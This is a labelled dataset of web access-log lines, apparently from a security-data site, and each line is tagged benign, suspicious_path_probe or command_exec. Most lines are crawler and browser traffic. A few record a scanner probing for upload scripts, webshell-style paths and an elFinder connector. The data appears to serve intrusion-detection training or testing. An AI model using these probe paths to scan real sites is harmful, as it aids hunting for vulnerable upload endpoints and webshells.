+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /ads.txt HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=439 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=333 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=495 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /sitemap.xml HTTP/1.1 STATUS=301 BYTES=496 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /sitemap.xml HTTP/1.1 STATUS=404 BYTES=305 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /sitemap.xml HTTP/1.1 STATUS=404 BYTES=305 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1 HTTP/1.1 STATUS=301 BYTES=619 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/ HTTP/1.1 STATUS=200 BYTES=811 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2 HTTP/1.1 STATUS=301 BYTES=618 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/ HTTP/1.1 STATUS=200 BYTES=809 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3 HTTP/1.1 STATUS=301 BYTES=618 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/ HTTP/1.1 STATUS=200 BYTES=800 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/dhcp.html HTTP/1.1 STATUS=200 BYTES=1438 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/dns.html HTTP/1.1 STATUS=200 BYTES=1543 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/files.html HTTP/1.1 STATUS=200 BYTES=1532 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/ftp.html HTTP/1.1 STATUS=200 BYTES=1507 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/http.html HTTP/1.1 STATUS=200 BYTES=1709 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/notice.html HTTP/1.1 STATUS=200 BYTES=1627 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/signatures.html HTTP/1.1 STATUS=404 BYTES=305 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/smtp.html HTTP/1.1 STATUS=200 BYTES=1614 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/ssh.html HTTP/1.1 STATUS=200 BYTES=1368 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/ssl.html HTTP/1.1 STATUS=200 BYTES=1585 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/tunnel.html HTTP/1.1 STATUS=200 BYTES=1470 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/Network/weird.html HTTP/1.1 STATUS=200 BYTES=1645 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/PE_malware/OPCleaver.html HTTP/1.1 STATUS=200 BYTES=1458 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/PE_malware/VirusShare.html HTTP/1.1 STATUS=200 BYTES=1628 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /Datasets Description/PE_malware/Zeus.html HTTP/1.1 STATUS=200 BYTES=1698 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /data HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET /self.logs/ HTTP/1.1 STATUS=200 BYTES=32375 UA=""Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/access.log.2019-10-24.gz HTTP/1.1 STATUS=200 BYTES=24512 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7533 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /Datasets Description/Network/http.html HTTP/1.1 STATUS=200 BYTES=1709 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=200 BYTES=368 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0""",benign
+"GET /self.logs/error.log.2019-01-24.gz HTTP/1.1 STATUS=200 BYTES=2375 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=333 UA=""Mozilla/5.0 (compatible; MojeekBot/0.10; +https://www.mojeek.com/bot.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13108 UA=""Mozilla/5.0 (compatible; MojeekBot/0.10; +https://www.mojeek.com/bot.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13147 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /uploads/up.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",suspicious_path_probe
+"GET /sites/all/libraries/elfinder/elfinder.php.html HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",command_exec
+"GET /images/vuln.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",suspicious_path_probe
+"GET /ups.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",suspicious_path_probe
+"GET /up.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",suspicious_path_probe
+"GET /wp-content/upload.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",suspicious_path_probe
+"GET /upload.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",suspicious_path_probe
+"GET /media-admin.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",suspicious_path_probe
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/access.log.2018-01-26.gz HTTP/1.1 STATUS=200 BYTES=37049 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /ads.txt HTTP/1.1 STATUS=301 BYTES=489 UA=""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",benign
+"GET /honeypot/bsidesdfw - 2014.ipynb HTTP/1.1 STATUS=301 BYTES=481 UA=""Tornado-Async-Client""",benign
+"GET /self.logs/access.log.2021-04-27.gz HTTP/1.1 STATUS=200 BYTES=19558 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2018-04-22.gz HTTP/1.1 STATUS=200 BYTES=4292 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13141 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=250 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27872 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7512 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=635 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13141 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=250 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27838 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7512 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /domaindata/domainmovement.zip HTTP/1.1 STATUS=200 BYTES=7437792 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47""",benign
+"GET /apple-touch-icon.png HTTP/1.1 STATUS=301 BYTES=515 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=301 BYTES=497 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /apple-touch-icon.png HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=200 BYTES=391 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /domainmovement.zip HTTP/1.1 STATUS=404 BYTES=284 UA=""curl/7.68.0""",benign
+"GET /domainmovement.zip HTTP/1.1 STATUS=404 BYTES=284 UA=""curl/7.68.0""",benign
+"GET /self.logs/error.log.2019-09-18.gz HTTP/1.1 STATUS=200 BYTES=3121 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /domaindata/domainmovement.zip HTTP/1.1 STATUS=200 BYTES=7437792 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 UA=""curl/7.68.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/bootstrap/img/favicon.ico"" UA=""Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)""",benign
+"GET /domaindata/domainmovement.zip HTTP/1.1 STATUS=200 BYTES=7437792 UA=""curl/7.68.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27893 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1""",benign
+"GET /self.logs/access.log.2019-01-27.gz HTTP/1.1 STATUS=200 BYTES=20274 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=340 UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=646 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=649 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/?C=D;O=D HTTP/1.1 STATUS=200 BYTES=728 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/?C=M;O=D HTTP/1.1 STATUS=200 BYTES=728 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/?C=N;O=A HTTP/1.1 STATUS=200 BYTES=732 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/?C=S;O=D HTTP/1.1 STATUS=200 BYTES=729 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/?C=D;O=D HTTP/1.1 STATUS=200 BYTES=646 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/?C=M;O=D HTTP/1.1 STATUS=200 BYTES=646 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/?C=N;O=A HTTP/1.1 STATUS=200 BYTES=649 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/?C=S;O=D HTTP/1.1 STATUS=200 BYTES=646 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/ HTTP/1.1 STATUS=200 BYTES=32338 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=32338 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=M;O=A HTTP/1.1 STATUS=200 BYTES=33640 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=33064 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=38285 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2015/ HTTP/1.1 STATUS=200 BYTES=7584 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/ HTTP/1.1 STATUS=200 BYTES=7823 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=D;O=D HTTP/1.1 STATUS=200 BYTES=33064 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=M;O=D HTTP/1.1 STATUS=200 BYTES=34941 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=N;O=A HTTP/1.1 STATUS=200 BYTES=32338 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/?C=S;O=D HTTP/1.1 STATUS=200 BYTES=38243 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/2015/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=7584 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2015/?C=M;O=A HTTP/1.1 STATUS=200 BYTES=7669 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2015/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=7730 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2015/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=8251 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=D;O=A HTTP/1.1 STATUS=200 BYTES=7823 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=M;O=A HTTP/1.1 STATUS=200 BYTES=7992 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=8035 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=S;O=A HTTP/1.1 STATUS=200 BYTES=8546 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2015/?C=D;O=D HTTP/1.1 STATUS=200 BYTES=7730 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2015/?C=M;O=D HTTP/1.1 STATUS=200 BYTES=7913 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
